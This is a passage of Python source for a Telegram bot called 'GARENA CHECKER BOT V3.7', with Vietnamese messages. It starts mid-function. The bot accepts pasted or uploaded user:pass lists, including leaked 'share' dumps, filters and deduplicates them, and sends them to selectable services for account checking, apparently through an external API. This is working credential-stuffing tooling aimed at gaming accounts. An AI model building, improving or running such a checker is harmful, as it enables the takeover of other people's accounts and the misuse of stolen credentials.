        checking = False
        safe_send_message(message.chat.id, "🛑 Da dung check!")
        return
    
    elif text == "👤 Admin":
        safe_send_message(message.chat.id, "👤 ADMIN\n@baohuyno1", reply_markup=create_admin_keyboard())
        return
    
    elif text == "📋 Service":
        msg = "📋 DANH SACH SERVICE\n\n"
        for key, value in SERVICE_ROUTES.items():
            msg += f"{value['icon']} {value['desc']}\n"
        safe_send_message(message.chat.id, msg)
        return
    
    if text.startswith('/'):
        return
    
    # XỬ LÝ TK MK
    accounts, stats_loc = loc_tk_mk_only(text)
    
    if not accounts:
        safe_send_message(message.chat.id, """
❌ KHONG TIM THAY TAI KHOAN!
Format dung: user:pass
VD: anhduckim1:kimanhduc1
""")
        return
    
    pending_accounts = accounts
    save_loc_file(accounts)
    
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    total = len(accounts)
    
    msg = f"""
📌 DA LOC {total} ACCOUNTS
✅ Valid: {stats_loc['valid']}
❌ Invalid: {stats_loc['invalid']}
🔄 Duplicate: {stats_loc['duplicate']}

Preview (10 dong dau):
{preview}

👇 Chon service de check:
"""
    
    safe_send_message(message.chat.id, msg, reply_markup=create_service_keyboard())

# ========== XỬ LÝ FILE ==========
@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Xử lý file tài liệu"""
    global pending_accounts
    
    if not is_admin(message.chat.id):
        return
    
    try:
        if not message.document.file_name.endswith('.txt'):
            safe_send_message(message.chat.id, "❌ Chi ho tro file .txt!")
            return
        
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        
        accounts, stats_loc = loc_tk_mk_only(content)
        
        if not accounts:
            safe_send_message(message.chat.id, "❌ Khong tim thay user:pass trong file!")
            return
        
        pending_accounts = accounts
        save_loc_file(accounts)
        
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        total = len(accounts)
        
        msg = f"""
✅ LOC XONG!
📊 Tong: {total} accounts
✅ Valid: {stats_loc['valid']}
❌ Invalid: {stats_loc['invalid']}
🔄 Duplicate: {stats_loc['duplicate']}

Preview (20 dong dau):
{preview}

👇 Chon service de check:
"""
        
        safe_send_message(message.chat.id, msg, reply_markup=create_service_keyboard())
        
        with open(OUTPUT_LOC, 'rb') as f:
            try:
                bot.send_document(message.chat.id, f, caption=f"📥 loc_accounts.txt ({total} accounts)")
            except:
                pass
        
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Loi: {e}")

# ========== LỆNH /start ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    """Xử lý lệnh /start"""
    if not is_admin(message.chat.id):
        return
    
    uptime = datetime.now() - bot_start_time
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    bot.send_message(
        message.chat.id,
        f"""
🤖 GARENA CHECKER BOT V3.7
👤 Admin: @baohuyno1
⏱ Uptime: {hours}h {minutes}m

📌 CACH DUNG:
1. Gui user:pass -> Chon service
2. Gui file .txt -> Tu dong loc
3. Gui share phuc tap -> Bot loc tu dong

🔧 API da fix chuẩn GET params
💡 Loc moi dinh dang share
""",
        reply_markup=create_main_keyboard()
    )

# ========== MAIN ==========
def main():
    """Hàm chính khởi động bot"""
    print("=" * 60)
    print("    GARENA CHECKER BOT V3.7 - API FIX ULTIMATE")
    print("    ADMIN: @baohuyno1")
    print("=" * 60)
    print(f"[*] Threads: {DEFAULT_THREADS}")
    print(f"[*] Services: {len(SERVICE_ROUTES)}")
    print(f"[*] API Base: {API_BASE}")
    print(f"[*] API User: {API_USERNAME}")
    print("=" * 60)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Loi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dung!")
        sys.exit(0)
